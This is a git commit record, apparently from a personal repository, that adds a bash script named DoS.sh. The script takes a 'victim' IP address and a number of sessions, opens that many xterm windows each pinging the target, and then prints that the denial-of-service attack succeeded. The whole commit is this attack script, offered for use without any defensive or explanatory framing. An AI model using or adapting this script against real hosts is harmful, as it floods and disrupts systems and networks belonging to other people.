21f7bfc4d16baf00e6967d4087a6208b7c6b2afc
petroffn <petroff.n@gmail.com>
2021-03-16 13:41:33 +0200

    Commit2

---
+++ DoS.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+if [[ ( $1 == "" ) || ( $2 == "" )]]; then
+	echo "Script usage is: $0 IP_Address_of_Victim Num_OfAttack_Session"
+	exit
+else
+	for (( i=1; i<=$2; i++ )); do
+		xterm -e ping $1 &
+	done
+fi
+echo "DoS Attack to [$1] with $2 attackers axecuted Successfuly !"
